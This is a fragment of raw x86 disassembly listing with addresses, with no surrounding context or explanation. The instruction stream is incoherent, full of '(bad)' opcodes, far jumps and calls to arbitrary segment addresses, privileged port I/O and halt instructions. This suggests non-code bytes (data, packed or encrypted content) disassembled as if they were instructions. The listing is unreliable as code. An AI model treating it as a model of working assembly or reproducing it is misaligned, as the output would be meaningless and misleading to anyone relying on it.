  42f759:	pop    edi
  42f75a:	and    eax,0x1e58a05a
  42f75f:	jo     0x42f6f0
  42f761:	jo     0x42f70b
  42f763:	(bad)  
  42f764:	scas   al,BYTE PTR es:[edi]
  42f765:	push   esi
  42f766:	leave  
  42f767:	inc    eax
  42f768:	test   DWORD PTR [edx+ecx*4+0x2a],edx
  42f76c:	or     al,BYTE PTR [ebx]
  42f76e:	xor    al,0x15
  42f770:	xor    eax,0x64df7ced
  42f775:	jne    0x42f7eb
  42f777:	push   eax
  42f778:	dec    eax
  42f779:	loop   0x42f707
  42f77b:	xor    BYTE PTR [esi-0x48],dl
  42f77e:	or     BYTE PTR [edx],dl
  42f780:	call   0x5d8fd41b
  42f785:	mov    al,bh
  42f787:	ins    BYTE PTR es:[edi],dx
  42f788:	out    0x5f,eax
  42f78a:	mov    BYTE PTR [eax],ah
  42f78c:	pop    edx
  42f78d:	sub    BYTE PTR [esi-0x49f78bf8],0xde
  42f794:	sub    DWORD PTR [edi+ebp*2-0x38],esp
  42f798:	pop    eax
  42f799:	ror    DWORD PTR [edx],1
  42f79b:	jmp    0x8154:0x76da5eb9
  42f7a2:	es mov al,0xaa
  42f7a5:	sbb    eax,0xd4b8b638
  42f7aa:	dec    esi
  42f7ab:	xchg   cx,ax
  42f7ad:	jbe    0x42f73e
  42f7af:	dec    ecx
  42f7b0:	cld    
  42f7b1:	mov    BYTE PTR ds:0x4e069820,cl
  42f7b7:	pop    ecx
  42f7b8:	pop    edi
  42f7b9:	inc    edi
  42f7ba:	sahf   
  42f7bb:	sub    esp,edi
  42f7bd:	and    al,0x5e
  42f7bf:	cs nop
  42f7c1:	clc    
  42f7c2:	sti    
  42f7c3:	xor    BYTE PTR ds:0x9db68b55,dl
  42f7c9:	pop    eax
  42f7ca:	cld    
  42f7cb:	retf   0xa076
  42f7ce:	adc    al,0x92
  42f7d0:	adc    eax,0x4c8b00c3
  42f7d5:	push   ss
  42f7d6:	push   eax
  42f7d7:	imul   edi,DWORD PTR [ebx],0xffffff8a
  42f7da:	push   esi
  42f7db:	fmul   QWORD PTR [eax+0x29]
  42f7de:	arpl   WORD PTR [esi-0x4b0f579],sp
  42f7e4:	pusha  
  42f7e5:	ins    DWORD PTR es:[edi],dx
  42f7e6:	inc    edi
  42f7e7:	pop    edx
  42f7e8:	sbb    BYTE PTR [esp+ecx*1],0x52
  42f7ec:	ss xchg ecx,eax
  42f7ee:	or     al,0xd6
  42f7f0:	xchg   BYTE PTR [esi+0x58de532a],al
  42f7f6:	push   ds
  42f7f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f7f8:	push   cs
  42f7f9:	imul   ebx,DWORD PTR [edx],0x30
  42f7fc:	push   ebp
  42f7fd:	sub    BYTE PTR [eax+0x9dc4237],ch
  42f803:	mov    al,ds:0x644db420
  42f808:	push   es
  42f809:	ds call 0xd005:0x53b8e88a
  42f811:	push   esp
  42f812:	jo     0x42f7c6
  42f814:	bound  ecx,QWORD PTR [esi+edi*8]
  42f817:	adc    BYTE PTR [eax+0x180d8906],bl
  42f81d:	and    BYTE PTR [esp+edx*2+0x660b4a68],al
  42f824:	and    BYTE PTR [edx],ah
  42f826:	loop   0x42f85b
  42f828:	sub    dl,BYTE PTR [eax+0x41]
  42f82b:	test   al,0x40
  42f82d:	call   0xd90aa6b8
  42f832:	add    eax,DWORD PTR [ebx]
  42f834:	xchg   ebp,eax
  42f835:	(bad)  
  42f836:	fs int3 
  42f838:	jg     0x42f7cd
  42f83a:	loop   0x42f83f
  42f83c:	mov    cl,0x41
  42f83e:	add    eax,0x17aab632
  42f843:	dec    edx
  42f844:	adc    BYTE PTR [ebx],cl
  42f846:	push   eax
  42f847:	test   eax,0x7a107002
  42f84c:	push   es
  42f84d:	lds    eax,FWORD PTR es:[esi+0xebed443]
  42f854:	out    dx,eax
  42f855:	test   DWORD PTR [edx-0xc],edx
  42f858:	jns    0x42f85b
  42f85a:	mov    cl,BYTE PTR [eax+0x3ae07a7c]
  42f860:	lea    eax,[eax]
  42f862:	pop    ebp
  42f863:	add    DWORD PTR [eax],0xda39a0b
  42f869:	fimul  WORD PTR [edx]
  42f86b:	pop    ebx
  42f86c:	adc    bl,cl
  42f86e:	xchg   esp,eax
  42f86f:	push   ebp
  42f870:	xchg   BYTE PTR [ecx-0x25],bh
  42f873:	push   ebx
  42f874:	repnz loope 0x42f8e7
  42f877:	inc    eax
  42f878:	add    BYTE PTR [ebx+0x64],cl
  42f87b:	repnz mov edx,0x110bb536
  42f881:	mov    esi,0xeebea603
  42f886:	push   cs
  42f887:	lahf   
  42f888:	or     cl,BYTE PTR [ecx]
  42f88a:	xchg   DWORD PTR [edx],eax
  42f88c:	(bad)  
  42f88d:	sahf   
  42f88e:	mov    WORD PTR ds:0xd66d1089,?
  42f894:	js     0x42f8ed
  42f896:	sbb    BYTE PTR [esi+0x33],0x2
  42f89a:	call   0x6b6a:0x20103213
  42f8a1:	xchg   edx,eax
  42f8a2:	js     0x42f8a4
  42f8a4:	aad    0x42
  42f8a6:	cs aam 0xf0
  42f8a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f8aa:	dec    ebp
  42f8ab:	mov    ah,0x92
  42f8ad:	iret   
  42f8ae:	or     BYTE PTR [edx+ecx*1+0x7a],bl
  42f8b2:	xchg   BYTE PTR [eax-0x1f2eaba6],al
  42f8b8:	and    al,BYTE PTR [esp+eax*2+0x447fe20b]
  42f8bf:	xor    eax,DWORD PTR [ebx+ebx*8]
  42f8c2:	pop    esi
  42f8c3:	(bad)  
  42f8c4:	aad    0xe8
  42f8c6:	add    al,0x3e
  42f8c8:	sub    ebp,0x20
  42f8cb:	push   ss
  42f8cc:	or     dl,BYTE PTR [eax+ebx*1-0x33]
  42f8d0:	xchg   esp,eax
  42f8d1:	(bad)  
  42f8d2:	shl    eax,cl
  42f8d4:	push   0xfebd8861
  42f8d9:	sbb    dh,ah
  42f8db:	xchg   DWORD PTR [eax+ebx*8],esi
  42f8de:	(bad)  
  42f8df:	pop    edx
  42f8e0:	or     dl,cl
  42f8e2:	and    eax,0x1db2b42e
  42f8e7:	mov    ds:0xfdd3882,eax
  42f8ec:	ss push ss
  42f8ee:	xor    eax,0xc23eadc2
  42f8f3:	pusha  
  42f8f4:	push   0x9745861
  42f8f9:	mov    dl,BYTE PTR [eax-0x42]
  42f8fc:	mov    al,bh
  42f8fe:	jl     0x42f916
  42f900:	rcr    DWORD PTR [esi],1
  42f902:	push   eax
  42f903:	sbb    BYTE PTR [eax],dh
  42f905:	cdq    
  42f906:	mov    dl,0x4d
  42f908:	add    eax,0x303fb574
  42f90d:	mov    ebx,0x77460096
  42f912:	jl     0x42f90b
  42f914:	ficom  DWORD PTR [edx+ebp*2+0x38784f0d]
  42f91b:	pop    ecx
  42f91c:	arpl   WORD PTR [edx+0x1a],di
  42f91f:	clc    
  42f920:	aad    0xb2
  42f922:	mov    eax,ds:0x2ae86b5b
  42f927:	push   eax
  42f928:	push   ebp
  42f929:	inc    esp
  42f92a:	cmp    BYTE PTR ss:[esi-0x7f65f6e4],ch
  42f931:	and    al,0x58
  42f934:	pop    eax
  42f935:	pusha  
  42f936:	jo     0x42f98c
  42f938:	(bad)  
  42f939:	(bad)  
  42f93a:	and    dl,BYTE PTR [ebp+0x48c0a3ab]
  42f940:	xchg   esp,eax
  42f941:	or     al,0x75
  42f943:	sar    dh,cl
  42f945:	and    BYTE PTR [ebp-0x80],ch
  42f948:	es inc esp
  42f94a:	xchg   esp,eax
  42f94b:	xor    edx,0x5c
  42f94e:	dec    ebx
  42f94f:	lock fidivr DWORD PTR [eax-0x4]
  42f953:	pop    es
  42f954:	mov    dh,0x5a
  42f956:	cmp    al,BYTE PTR [ecx-0x64]
  42f959:	inc    ebx
  42f95a:	cmp    edx,DWORD PTR [edx]
  42f95c:	mov    al,0x2c
  42f95e:	mov    esp,DWORD PTR [edi-0x4647a430]
  42f964:	je     0x42f95a
  42f966:	push   0x5c424361
  42f96b:	loope  0x42f9b7
  42f96d:	je     0x42f9cb
  42f96f:	xor    al,0xf0
  42f971:	mov    BYTE PTR [edx-0x7a],bl
  42f974:	cdq    
  42f975:	pop    edi
  42f976:	mov    al,ds:0x242e9b12
  42f97b:	ins    BYTE PTR es:[edi],dx
  42f97c:	cmp    BYTE PTR [esp+esi*4-0x723bc98],dl
  42f983:	cmp    edx,DWORD PTR [edx]
  42f985:	shl    BYTE PTR [ecx],1
  42f987:	adc    bl,BYTE PTR [esi]
  42f989:	nop
  42f98a:	rcl    BYTE PTR [eax+0x58e0d55a],1
  42f990:	fisub  DWORD PTR [esp]
  42f993:	aas    
  42f994:	xchg   ebp,eax
  42f995:	or     DWORD PTR [edx],ebp
  42f997:	adc    ah,cl
  42f999:	adc    ah,BYTE PTR [edx+ebp*8]
  42f99c:	push   0xf82d8db
  42f9a1:	mov    ds:0xbd8d2b6,al
  42f9a6:	adc    ah,bh
  42f9a8:	xchg   BYTE PTR [edx+0x240848d6],bl
  42f9ae:	mov    dl,0x4e
  42f9b0:	jbe    0x42f958
  42f9b2:	inc    esp
  42f9b3:	imul   eax,DWORD PTR ds:0x6c40e215,0xffffff84
  42f9ba:	cs ret 0xa352
  42f9be:	fsub   st,st(1)
  42f9c0:	xchg   esp,eax
  42f9c1:	or     al,0x8
  42f9c3:	mov    esi,0xecf9a00
  42f9c8:	push   eax
  42f9c9:	xor    DWORD PTR ds:0x72b89896,esp
  42f9cf:	cmc    
  42f9d0:	mov    DWORD PTR ds:0xe1bea82,ecx
  42f9d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d7:	pop    ecx
  42f9d8:	pushf  
  42f9d9:	mov    dl,0xad
  42f9db:	loop   0x42f96f
  42f9dd:	push   0x31
  42f9df:	xlat   BYTE PTR fs:[ebx]
  42f9e1:	test   BYTE PTR [esi+0x2184ae0a],cl
  42f9e7:	mov    cl,BYTE PTR es:[edx+0x9]
  42f9eb:	add    BYTE PTR [edx+0x1a02dcba],dh
  42f9f1:	dec    BYTE PTR [eax-0x4a]
  42f9f4:	push   cs
  42f9f5:	jmp    0xc322:0xdb414641
  42f9fc:	dec    edi
  42f9fd:	jo     0x42fa60
  42f9ff:	inc    edx
  42fa00:	add    al,ch
  42fa02:	mov    eax,0xaf64f114
  42fa07:	jp     0x42fa11
  42fa09:	not    BYTE PTR [esi-0x6e7efc27]
  42fa0f:	or     al,ch
  42fa11:	push   esi
  42fa12:	int3   
  42fa13:	mov    al,ds:0xd8028056
  42fa18:	inc    ebp
  42fa19:	cs in  eax,dx
  42fa1b:	lods   al,BYTE PTR ds:[esi]
  42fa1c:	jl     0x42f9bf
  42fa1e:	rcl    ah,0x2a
  42fa21:	jp     0x42f9da
  42fa23:	xor    BYTE PTR [eax+0x8e5de46],0x2f
  42fa2a:	aad    0xb1
  42fa2c:	cwde   
  42fa2d:	imul   ebx,DWORD PTR [ecx+0x30],0x21
  42fa31:	xchg   BYTE PTR [eax],ah
  42fa33:	loop   0x42fa62
  42fa35:	cmp    BYTE PTR [edx],dh
  42fa37:	ds cld 
  42fa39:	push   cs
  42fa3a:	push   ebx
  42fa3b:	cs add eax,0xe22afdf6
  42fa41:	xchg   ebx,eax
  42fa42:	jp     0x42fa51
  42fa44:	and    BYTE PTR [edx+0x512c3617],al
  42fa4a:	clc    
  42fa4b:	nop
  42fa4c:	mov    cl,0x82
  42fa4e:	add    ebp,DWORD PTR [ecx+0x74]
  42fa51:	and    eax,0xac8b1a1c
  42fa56:	fmul   st(3),st
  42fa58:	mov    WORD PTR fs:[ecx-0x52baaba9],ss
  42fa5f:	test   al,0x41
  42fa61:	or     BYTE PTR [eax+0x4fecbf74],ch
  42fa67:	hlt    
  42fa68:	dec    ecx
  42fa69:	aam    0x2c
  42fa6b:	or     al,0xa5
  42fa6d:	enter  0xfc52,0xc1
  42fa71:	mov    ds:0x745a033d,eax
  42fa76:	es cs push edx
  42fa79:	out    dx,al
  42fa7a:	push   edx
  42fa7b:	xor    esi,DWORD PTR [esi+0x4eb549aa]
  42fa81:	mov    ss,WORD PTR [ecx]
  42fa83:	pushf  
  42fa84:	push   edx
  42fa85:	adc    cl,BYTE PTR [edx-0x73655317]
  42fa8b:	es inc eax
  42fa8d:	mov    ds:0x736074bb,al
  42fa92:	sbb    DWORD PTR [eax],eax
  42fa94:	shl    DWORD PTR [esi+0x22],0x29
  42fa98:	mov    esi,0xfa0c9a28
  42fa9d:	ins    DWORD PTR es:[edi],dx
  42fa9e:	add    eax,0xc728b6a6
  42faa3:	scas   eax,DWORD PTR es:[edi]
  42faa4:	(bad)  
  42faa5:	icebp  
  42faa6:	sub    BYTE PTR [eax],bl
  42faa8:	outs   dx,BYTE PTR ds:[esi]
  42faa9:	les    edi,FWORD PTR [esi-0x1f]
  42faac:	xor    al,0x5f
  42faae:	mov    eax,ds:0x70f29494
  42fab3:	add    BYTE PTR fs:[bp-0x27ff],dh
  42fab9:	push   ebp
  42faba:	dec    ebp
  42fabb:	cmp    al,0x41
  42fabd:	add    cl,dl
  42fabf:	pop    edi
  42fac0:	or     dl,BYTE PTR [esi+0x55]
  42fac3:	cmp    BYTE PTR [eax-0x486910fc],bh
  42fac9:	int3   
  42faca:	pusha  
  42facb:	push   0x74
  42facd:	pop    ebx
  42face:	shl    DWORD PTR ds:0x14e85062,cl
  42fad4:	cmp    bl,BYTE PTR [esi]
  42fad6:	out    dx,al
  42fad7:	add    al,0x86
  42fad9:	imul   ebx,DWORD PTR [ecx],0xf
  42fadc:	inc    edx
  42fadd:	mov    ebp,0x68245a3d
  42fae2:	or     al,BYTE PTR gs:[edx+0x75666282]
  42fae9:	cmp    al,0x89
  42faeb:	lods   eax,DWORD PTR ds:[esi]
  42faec:	retf   
  42faed:	lock sahf 
  42faef:	pop    ds
  42faf0:	ds pop esp
  42faf2:	or     BYTE PTR [esi-0x55e55b41],bh
  42faf8:	fiadd  DWORD PTR [ebp-0x1a9bccb6]
  42fafe:	pop    edx
  42faff:	dec    ebp
  42fb00:	mov    esp,0xd0b625ce
  42fb05:	mov    edx,0x93a73c2
  42fb0a:	or     BYTE PTR [ebx+ebp*4-0x268b24cb],dh
  42fb11:	in     eax,0xe2
  42fb13:	hlt    
  42fb14:	inc    esp
  42fb15:	push   edx
  42fb16:	ins    BYTE PTR es:[edi],dx
  42fb17:	ret    0x8329
  42fb1a:	aaa    
  42fb1b:	sbb    ch,ah
  42fb1d:	aaa    
  42fb1e:	pop    esi
  42fb1f:	loop   0x42fb36
  42fb21:	mov    BYTE PTR [edx-0x687f835a],ch
  42fb27:	add    BYTE PTR [edx+0x4b],bl
  42fb2a:	lods   al,BYTE PTR ds:[esi]
  42fb2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb2c:	cwde   
  42fb2d:	pop    edi
  42fb2e:	push   cs
  42fb2f:	inc    esi
  42fb30:	inc    ebx
  42fb31:	(bad)  
  42fb32:	xor    esp,DWORD PTR [esi]
  42fb34:	jge    0x42fb96
  42fb36:	ficomp DWORD PTR [eax-0x79de4a3f]
  42fb3c:	adc    cl,al
  42fb3e:	fadd   QWORD PTR [edx+0x56]
  42fb41:	inc    esi
  42fb42:	pop    ss
  42fb43:	add    al,0xdc
  42fb45:	cmp    al,0xaa
  42fb47:	adc    ebx,DWORD PTR ds:0xccbc0255
  42fb4d:	or     al,0xe0
  42fb4f:	fld    TBYTE PTR [eax+0x711c0eb2]
  42fb55:	call   0x3524:0xea2abd3c
  42fb5c:	loopne 0x42fb55
  42fb5e:	dec    esp
  42fb5f:	pop    esp
  42fb60:	mov    ah,0xd
  42fb62:	lods   eax,DWORD PTR ds:[esi]
  42fb63:	mov    ch,0x1e
  42fb65:	hlt    
  42fb66:	repz mov al,ds:0x4aa4d0de
  42fb6c:	imul   esp,DWORD PTR [eax-0x6c],0x4a1de347
  42fb73:	shl    BYTE PTR [eax+0x92ce54],0x85
  42fb7a:	popa   
  42fb7b:	mov    DWORD PTR ds:0xfe46cb0,0xfb06a190
  42fb85:	pop    edx
  42fb86:	jle    0x42fbe2
  42fb88:	scas   eax,DWORD PTR es:[edi]
  42fb89:	cmp    dh,BYTE PTR gs:[edx+0x2a]
  42fb8d:	mov    esp,0xad68d43d
  42fb92:	mov    eax,ds:0xbbd2bec0
  42fb97:	mov    WORD PTR [ecx],?
  42fb99:	call   0x35809067
  42fb9e:	pushf  
  42fb9f:	pusha  
  42fba0:	stos   DWORD PTR es:[edi],eax
  42fba1:	pushf  
  42fba2:	push   edi
  42fba3:	adc    BYTE PTR [edx],0xa9
  42fba6:	pop    edx
  42fba7:	add    al,0xc8
  42fba9:	jmp    DWORD PTR [ebx+0x43416c3]
  42fbaf:	dec    esp
  42fbb0:	pop    edx
  42fbb1:	pop    ebx
  42fbb2:	hlt    
  42fbb3:	call   0x3ba3c606
  42fbb8:	shl    DWORD PTR [ecx-0x7b812ee8],cl
  42fbbe:	fild   WORD PTR [esi-0x12]
  42fbc1:	int    0x89
  42fbc3:	push   esp
  42fbc4:	push   ebp
  42fbc5:	jne    0x42fbc7
  42fbc7:	cmp    al,0x4b
  42fbc9:	dec    esi
  42fbca:	in     eax,dx
  42fbcb:	pushf  
  42fbcc:	fild   DWORD PTR [edx]
  42fbce:	ins    BYTE PTR es:[edi],dx
  42fbcf:	inc    edi
  42fbd0:	fiadd  DWORD PTR [esp+esi*4]
  42fbd3:	enter  0x880,0xa6
  42fbd7:	lock not dh
  42fbda:	imul   edi,DWORD PTR [ebx],0xffffffbe
  42fbdd:	lods   eax,DWORD PTR ds:[esi]
  42fbde:	push   0xc8ccdbb2
  42fbe3:	xchg   esi,eax
  42fbe4:	and    BYTE PTR cs:[edx],cl
  42fbe7:	push   ss
  42fbe8:	lock inc ebx
  42fbea:	inc    esp
  42fbeb:	mov    ds:0x28e31c90,eax
  42fbf0:	push   eax
  42fbf1:	ins    BYTE PTR es:[edi],dx
  42fbf2:	cmp    BYTE PTR [eax],cl
  42fbf4:	(bad)  
  42fbf5:	push   esi
  42fbf6:	cmp    BYTE PTR [edi+0x34ad3c2e],bh
  42fbfc:	aam    0x92
  42fbfe:	add    DWORD PTR [eax+0x79a19b70],ecx
  42fc04:	sub    ecx,esp
  42fc06:	iret   
  42fc07:	pop    eax
  42fc08:	push   cs
  42fc09:	add    BYTE PTR [edi],ah
  42fc0b:	push   esi
  42fc0c:	sbb    dl,BYTE PTR gs:[edi+ecx*8+0xad983ce]
  42fc14:	dec    esp
  42fc15:	cs int3 
  42fc17:	je     0x42fbd7
  42fc19:	fbld   TBYTE PTR [edx]
  42fc1b:	ret    0xff35
  42fc1e:	add    BYTE PTR [esi+0x72001232],0x4
  42fc25:	add    BYTE PTR ds:0xab9b009a,bl
  42fc2b:	in     eax,0x36
  42fc2d:	call   0x9da7b95b
  42fc32:	add    BYTE PTR [ecx],dl
  42fc34:	ins    DWORD PTR es:[edi],dx
  42fc35:	out    dx,al
  42fc36:	or     BYTE PTR [esi-0x4d],ah
  42fc39:	imul   edi,DWORD PTR [ecx+ecx*1+0x1e4c829a],0x8e487c
  42fc44:	mov    edx,0xa229f45
  42fc49:	aam    0x4c
  42fc4b:	inc    esi
  42fc4c:	mov    ch,0x3e
  42fc4e:	mov    dl,BYTE PTR [ebp+0x32]
  42fc51:	scas   al,BYTE PTR es:[edi]
  42fc52:	test   al,al
  42fc54:	hlt    
  42fc55:	(bad)  
  42fc56:	out    0xf2,al
  42fc58:	hlt    
  42fc59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fc5a:	dec    ebx
  42fc5b:	add    DWORD PTR [edx],esp
  42fc5d:	pop    ecx
  42fc5e:	les    ecx,FWORD PTR [eax+0x337700e9]
  42fc64:	pop    edi
  42fc65:	push   eax
  42fc66:	shr    BYTE PTR [eax],1
  42fc68:	mov    bl,0x4e
  42fc6a:	out    dx,al
  42fc6b:	add    BYTE PTR [edx-0x6],ch
  42fc6e:	add    BYTE PTR [edx],al
  42fc70:	add    ebx,esp
  42fc72:	mov    ah,0xaa
  42fc74:	punpckhbw mm6,QWORD PTR [edi]
  42fc77:	push   eax
  42fc78:	push   ss
  42fc79:	loop   0x42fcdb
  42fc7b:	mov    ebx,DWORD PTR [edx-0x4eefc5d6]
  42fc81:	push   ebp
  42fc82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fc83:	pop    esi
  42fc84:	fcomp  QWORD PTR [edi+0x78d860d4]
  42fc8a:	ins    BYTE PTR es:[edi],dx
  42fc8b:	sub    eax,0xfca14ae8
  42fc90:	popa   
  42fc91:	sbb    bh,BYTE PTR [edx+eiz*4-0x10]
  42fc95:	xor    BYTE PTR [ebp+ebx*2-0x2f],bl
  42fc99:	dec    esp
  42fc9a:	arpl   dx,dx
  42fc9c:	sub    al,0xc2
  42fc9e:	and    eax,0x3aaea874
  42fca3:	xchg   esp,eax
  42fca4:	sub    BYTE PTR [eax],al
  42fca6:	mov    dl,0xb4
  42fca8:	outs   dx,BYTE PTR ds:[esi]
  42fca9:	adc    al,0x65
  42fcac:	arpl   WORD PTR [esi-0x5fbdf244],di
  42fcb2:	xor    eax,0x6730d2a8
  42fcb7:	mov    ebx,0xea90dce2
  42fcbc:	sub    dh,BYTE PTR [edx+0x5325e84d]
  42fcc2:	push   ss
  42fcc3:	mov    dh,0xe8
  42fcc5:	sub    al,0xdf
  42fcc7:	das    
  42fcc8:	gs push esp
  42fcca:	ins    BYTE PTR es:[edi],dx
  42fccb:	jo     0x42fc95
  42fccd:	fst    DWORD PTR [esi]
  42fccf:	mov    DWORD PTR [ecx+ecx*8],esi
  42fcd2:	xor    DWORD PTR [eax-0x79a62ffb],0x3ae8c8fa
  42fcdc:	js     0x42fce6
  42fcde:	push   esp
  42fcdf:	pop    edx
  42fce0:	dec    esp
  42fce1:	adc    esi,eax
  42fce3:	test   al,0x37
  42fce5:	xchg   esp,edx
  42fce7:	scas   al,BYTE PTR es:[edi]
  42fce8:	data16 (bad) 
  42fceb:	pop    ebp
  42fcec:	je     0x42fd1a
  42fcee:	imul   ecx,DWORD PTR [eax+edx*1],0x41
  42fcf2:	inc    ebp
  42fcf3:	jmp    0x42fca7
  42fcf5:	or     ebx,DWORD PTR [edx-0x17f5abf8]
  42fcfb:	mov    cs,WORD PTR [eax-0x40]
  42fcfe:	push   esp
  42fcff:	ss push esp
  42fd01:	push   esi
  42fd02:	inc    edi
  42fd03:	out    dx,al
  42fd04:	push   es
  42fd05:	and    ebx,DWORD PTR [eax]
  42fd07:	cmp    ecx,DWORD PTR [edx]
  42fd09:	dec    esi
  42fd0a:	pop    ds
  42fd0b:	mov    ah,0x67
  42fd0d:	mov    al,0x38
  42fd0f:	jnp    0x42fd27
  42fd11:	xlat   BYTE PTR ss:[ebx]
  42fd13:	jne    0x42fd92
  42fd15:	in     al,dx
  42fd16:	(bad)  
  42fd17:	ror    BYTE PTR [eax-0x52],1
  42fd1a:	aad    0xc4
  42fd1c:	add    BYTE PTR [ebx+0x53],dl
  42fd1f:	inc    edi
  42fd20:	test   eax,0x2fa3896
  42fd25:	mov    BYTE PTR [ebx+ebp*4+0x68],ch
  42fd29:	and    bh,BYTE PTR [edx+0x15]
  42fd2c:	inc    eax
  42fd2d:	mov    eax,ds:0x88c64b3a
  42fd32:	shl    BYTE PTR [edx],0xc7
  42fd35:	(bad)  
  42fd36:	call   0x2c7e:0xcf858dd
  42fd3d:	sub    BYTE PTR [eax],ch
  42fd3f:	mov    dh,0x40
  42fd41:	cmc    
  42fd42:	xchg   ebx,eax
  42fd43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd44:	pop    esi
  42fd45:	mov    ebp,0xde885ad8
  42fd4a:	jbe    0x42fd87
  42fd4c:	push   ds
  42fd4d:	imul   ebp,DWORD PTR [eax+eax*2-0x67],0xccf9be1b
  42fd55:	add    eax,0xd4d114f2
  42fd5a:	popa   
  42fd5b:	mov    esi,0xcceea4ba
  42fd60:	mov    eax,ds:0x28ea11e0
  42fd65:	xor    al,ah
  42fd67:	pop    ds
  42fd68:	ins    BYTE PTR es:[edi],dx
  42fd69:	push   eax
  42fd6a:	sub    BYTE PTR [eax+0x4a],dh
  42fd6d:	mov    cl,0xc2
  42fd6f:	adc    ebp,ebx
  42fd71:	inc    eax
  42fd72:	lods   al,BYTE PTR ds:[esi]
  42fd73:	pusha  
  42fd74:	mov    ebx,0x83306dad
  42fd79:	shl    dh,0x81
  42fd7c:	outs   dx,DWORD PTR ds:[esi]
  42fd7d:	jbe    0x42fdc1
  42fd7f:	push   0xffffff9c
  42fd81:	ss jle 0x42fd8d
  42fd84:	sbb    eax,0xea8a0f8a
  42fd89:	xchg   ebx,eax
  42fd8a:	mov    DWORD PTR ds:0x36560e00,ebx
  42fd90:	je     0x42fe07
  42fd92:	jo     0x42fdd8
  42fd94:	loope  0x42fdb9
  42fd96:	sub    al,0xbe
  42fd98:	jmp    0x51d0:0x326bd5c2
  42fd9f:	dec    esi
  42fda0:	xchg   edi,eax
  42fda1:	push   ds
  42fda2:	cmp    esi,DWORD PTR [edx-0x5d5e1719]
  42fda8:	aad    0x2
  42fdaa:	in     al,0xbf
  42fdac:	dec    eax
  42fdad:	scas   eax,DWORD PTR es:[edi]
  42fdae:	retf   0x4022
  42fdb1:	pop    ds
  42fdb2:	add    BYTE PTR ds:0xd058a225,bh
  42fdb8:	and    eax,0x65d8c83e
  42fdbd:	call   0xdf5f:0xd0cfcf74
  42fdc4:	xor    BYTE PTR [ecx],dl
  42fdc6:	inc    edi
  42fdc7:	adc    ah,BYTE PTR [eax-0x3]
  42fdca:	push   0xffffffdb
  42fdcc:	clc    
  42fdcd:	dec    eax
  42fdce:	lods   eax,DWORD PTR ds:[esi]
  42fdcf:	lods   al,BYTE PTR ds:[esi]
  42fdd0:	test   DWORD PTR [ebp+0x36979986],0xde1c37b6
  42fdda:	retf   
  42fddb:	es stos BYTE PTR es:[edi],al
  42fddd:	dec    ebp
  42fdde:	add    BYTE PTR ds:0x8e47dc76,dh
  42fde4:	popa   
  42fde5:	ins    BYTE PTR es:[edi],dx
  42fde6:	(bad)  
  42fde7:	(bad)  
  42fde9:	lods   al,BYTE PTR ds:[esi]
  42fdea:	gs sbb ah,cl
  42fded:	in     eax,dx
  42fdee:	pop    eax
  42fdef:	and    edx,ebp
  42fdf1:	and    ah,BYTE PTR [ecx+edi*2-0x2716bf2c]
  42fdf8:	push   esi
  42fdf9:	dec    ebp
  42fdfa:	jge    0x42fdc7
  42fdfc:	mov    dh,0xe5
  42fdfe:	jle    0x42fdfa
  42fe00:	push   0x68
  42fe02:	add    eax,0x8c464857
  42fe07:	add    BYTE PTR [ebx],ah
  42fe09:	xchg   esi,eax
  42fe0a:	(bad)  
  42fe0c:	sbb    eax,0xab68180a
  42fe11:	pop    eax
  42fe12:	(bad)  
  42fe15:	push   ecx
  42fe16:	ss pop edx
  42fe18:	rcl    DWORD PTR [ebp-0x5c65abea],0xc6
  42fe1f:	jecxz  0x42fe17
  42fe21:	adc    al,0x10
  42fe23:	lea    eax,[eax]
  42fe25:	fcomp  DWORD PTR [edx]
  42fe27:	mov    edx,0x43f89868
  42fe2c:	dec    esp
  42fe2d:	mov    ah,0x54
  42fe2f:	mov    esp,0xf61db1a4
  42fe34:	inc    edx
  42fe35:	cmp    ah,bh
  42fe37:	out    0xe4,eax
  42fe39:	and    BYTE PTR [ecx],ah
  42fe3b:	xor    al,0xa
  42fe3d:	scas   al,BYTE PTR es:[edi]
  42fe3e:	sub    al,0x98
  42fe40:	jbe    0x42fdf6
  42fe42:	jmp    0x42fec2
  42fe44:	inc    eax
  42fe45:	or     eax,esp
  42fe47:	fcomp  QWORD PTR [eax]
  42fe49:	sub    esp,DWORD PTR [edx+0x1066f5be]
  42fe4f:	add    DWORD PTR [edx+0x2],edi
  42fe52:	adc    cl,ah
  42fe54:	(bad)  
  42fe55:	loope  0x42fe61
  42fe57:	adc    ch,BYTE PTR [edi+0x62]
  42fe5a:	cdq    
  42fe5b:	rol    DWORD PTR [eax],cl
  42fe5d:	outs   dx,DWORD PTR ds:[esi]
  42fe5e:	cmp    al,0xc1
  42fe60:	add    BYTE PTR [ebx-0x3e],dl
  42fe63:	mov    al,0xa0
  42fe65:	mov    eax,ds:0x529eadfe
  42fe6a:	rcl    BYTE PTR [ebp-0x7e5e8567],0xcd
  42fe71:	imul   ebp,esp,0x769f4cfa
  42fe77:	shl    DWORD PTR [esi+0x0],0xe3
  42fe7b:	(bad)
  42fe7f:	xchg   DWORD PTR cs:[ecx+0x6c],ebx
  42fe83:	xor    al,0x14
  42fe85:	mov    DWORD PTR [eax],esp
  42fe87:	pushf  
  42fe88:	push   cs
  42fe89:	push   ds
  42fe8a:	stos   BYTE PTR es:[edi],al
  42fe8b:	xor    al,0x7c
  42fe8d:	adc    dh,BYTE PTR [esi]
  42fe8f:	push   esp
  42fe90:	jo     0x42fea9
  42fe92:	es jne 0x42fec9
  42fe95:	push   eax
  42fe96:	xor    BYTE PTR [eax-0x38],ah
  42fe99:	mov    dh,0xae
  42fe9b:	imul   eax,DWORD PTR [edx],0x69
  42fe9e:	stos   BYTE PTR es:[edi],al
  42fe9f:	aaa    
  42fea0:	dec    esp
  42fea1:	inc    ecx
  42fea2:	jnp    0x42ff1a
  42fea4:	in     eax,dx
  42fea5:	mov    dh,0xa3
  42fea7:	mov    al,ds:0xac4859c8
  42feac:	rcl    BYTE PTR [eax],0x2f
  42feaf:	out    dx,al
  42feb0:	cwde   
  42feb1:	add    ah,al
  42feb3:	shl    BYTE PTR [edi],1
  42feb5:	sbb    bh,BYTE PTR [ebx-0x4bc9e156]
  42febb:	dec    eax
  42febc:	push   esi
